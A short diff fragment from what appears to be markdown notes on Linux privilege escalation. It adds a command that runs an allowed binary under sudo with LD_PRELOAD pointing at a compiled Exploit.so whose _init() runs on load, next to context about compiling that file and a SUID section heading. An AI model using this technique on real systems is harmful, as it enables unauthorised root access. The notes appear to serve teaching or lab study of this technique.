@@ -38,6 +38,7 @@ Complie this text as a shared extension
 - *Exploit.c    |    input file.*
 - *nostartfiles	Prevents standard startup routines so _init() executes immediately.*
 
+**Finnaly** ```sudo LD_PRELOAD=./Exploit.so <allowed_binary>``
 
 ## SUID
 
